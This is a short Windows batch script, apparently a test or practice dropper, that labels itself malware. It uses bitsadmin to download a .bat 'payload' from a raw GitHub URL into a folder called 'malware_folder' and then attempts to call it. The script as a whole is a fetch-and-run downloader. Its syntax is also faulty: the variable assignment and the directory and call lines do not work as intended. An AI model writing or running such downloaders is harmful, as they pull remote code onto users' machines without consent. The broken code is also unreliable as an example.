
@echo off

echo Hello, this is a BAT file!
set path = C:\Users\Public\malware_folder
mkdir path
bitsadmin /transfer download https://raw.githubusercontent.com/duydang2002/TestScript/refs/heads/main/test.bat path/payload.bat
echo Malware Dowloaded.
call path Code1, Code2, path
pause